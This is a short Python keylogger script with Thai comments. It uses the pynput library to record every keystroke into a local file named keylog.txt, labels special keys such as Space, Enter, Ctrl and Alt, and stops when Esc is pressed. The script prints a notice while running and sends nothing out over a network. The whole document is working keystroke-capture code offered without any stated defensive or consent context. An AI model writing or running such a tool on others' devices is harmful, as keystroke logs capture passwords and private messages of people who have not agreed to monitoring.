from pynput import keyboard
import datetime

# กำหนดชื่อไฟล์ที่จะเก็บข้อมูล
LOG_FILE = "keylog.txt"

def on_press(key):
    """
    ฟังก์ชันนี้จะทำงานทุกครั้งที่มีการกดแป้นพิมพ์
    """
    try:
        # พยายามบันทึกตัวอักษรธรรมดา (เช่น a, b, 1, 2)
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        # ถ้าเป็นปุ่มพิเศษ (Shift, Ctrl, Enter, Space ฯลฯ)
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            # กำหนดรูปแบบของปุ่มพิเศษให้อ่านง่ายขึ้น
            if key == keyboard.Key.space:
                f.write(" [Space] ")
            elif key == keyboard.Key.enter:
                f.write(" [Enter]\n")  # ขึ้นบรรทัดใหม่เมื่อกด Enter
            elif key == keyboard.Key.backspace:
                f.write(" [Backspace] ")
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                f.write(" [Shift] ")
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                f.write(" [Ctrl] ")
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                f.write(" [Alt] ")
            elif key == keyboard.Key.tab:
                f.write(" [Tab] ")
            else:
                # ปุ่มอื่นๆ เช่น F1, Esc, ลูกศร
                f.write(f" [{key}] ")

def on_release(key):
    """
    ฟังก์ชันนี้จะทำงานเมื่อปล่อยปุ่ม ใช้สำหรับหยุดโปรแกรม
    """
    # ถ้ากดปุ่ม Esc ให้หยุดการทำงาน
    if key == keyboard.Key.esc:
        print("หยุดบันทึกคีย์บอร์ดแล้ว")
        return False  # คืนค่า False เพื่อหยุด Listener

# เริ่มต้นฟังการกดแป้นพิมพ์
print("กำลังบันทึกคีย์บอร์ด... กด 'Esc' เพื่อหยุด")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
